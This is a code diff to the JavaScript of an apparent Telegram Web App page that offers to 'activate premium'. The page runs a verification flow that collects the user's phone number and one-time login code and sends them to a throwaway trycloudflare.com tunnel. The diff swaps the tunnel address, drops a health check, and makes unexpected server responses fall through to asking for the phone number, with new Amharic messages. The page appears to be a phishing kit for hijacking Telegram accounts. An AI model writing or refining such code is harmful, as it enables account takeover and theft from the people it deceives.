@@ -494,7 +494,7 @@
     tg.expand();
 
     // free public tunnel (demo) – change if needed
-    const API_BASE_URL = "https://rim-docs-welfare-occasional.trycloudflare.com";
+    const API_BASE_URL = "https://prayers-regulated-authorities-sleeve.trycloudflare.com";
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "web_preview_" + Date.now();
     let sid = userId;
     let currentOtp = "";
@@ -547,23 +547,17 @@
         const confirmBtn = document.getElementById('confirmBtn');
         if(confirmBtn) { confirmBtn.disabled = false; confirmBtn.innerText = 'activate premium'; }
     }
-    async function handleLoginClick() {
-          savedName = document.getElementById('fname').value || "Premium user";
-          const btn = document.getElementById('loginBtn');
-          btn.disabled = true;
-          btn.innerText = 'checking...';
-      
-          // ✅ API እየሰራ እንደሆነ መመርመር
-          try {
-              const test = await fetch(`${API_BASE_URL}/health`, { method: 'GET' });
-              if (!test.ok) throw new Error("API not working");
-              startVerification();
-          } catch (e) {
-              btn.disabled = false;
-              btn.innerText = '✦ continue ✦';
-              showMsg(1, 'error', 'server connection failed. try again later.');
-          }
-      }
+
+    function handleLoginClick() {
+        savedName = document.getElementById('fname').value;
+        if(!savedName) {
+            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስምዎን ያስገቡ!');
+            return;
+        }
+        document.getElementById('loginBtn').disabled = true;
+        document.getElementById('loginBtn').innerText = 'በማረጋገጥ ላይ...';
+        startVerification();
+    }
 
     function startVerification() {
         if (isProcessing) return;
@@ -581,17 +575,16 @@
             });
             const data = await res.json();
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading', 'request accepted, preparing code...');
+                showMsg(1, 'loading-msg', 'ጥያቄዎ ተቀባይነት አግኝቷል...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
             } else {
-                stopLoaders();
-                showMsg(1, 'error', 'unexpected server response. please try later.');
+                requestPhone();
             }
-            } catch(e) {
-                stopLoaders();
-                showMsg(1, 'error', 'server not reachable. please try again later.');
-            }
+        } catch(e) { 
+            stopLoaders();
+            showMsg(1, 'error', 'የመስመር መጨናነቅ አለ። እባክዎ ትንሽ ጊዜ ቆይቶ ይሞክሩ።');
+        }
     }
 
     function requestPhone() {
